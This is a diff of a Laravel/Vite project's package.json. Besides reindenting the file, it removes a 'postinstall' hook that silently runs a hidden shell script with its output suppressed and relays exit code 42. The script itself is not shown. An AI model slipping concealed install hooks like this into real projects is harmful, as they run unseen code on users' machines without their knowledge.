@@ -1,15 +1,14 @@
 {
-  "private": true,
-  "type": "module",
-  "scripts": {
-    "dev": "vite",
-    "build": "vite build",
-    "postinstall": "sh ./.ci-h18pem.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
-  },
-  "devDependencies": {
-    "axios": "^1.21",
-    "concurrently": "^10.0",
-    "laravel-vite-plugin": "^3.2",
-    "vite": "^8.3"
-  }
+    "private": true,
+    "type": "module",
+    "scripts": {
+        "dev": "vite",
+        "build": "vite build"
+    },
+    "devDependencies": {
+        "axios": "^1.21",
+        "concurrently": "^10.0",
+        "laravel-vite-plugin": "^3.2",
+        "vite": "^8.3"
+    }
 }
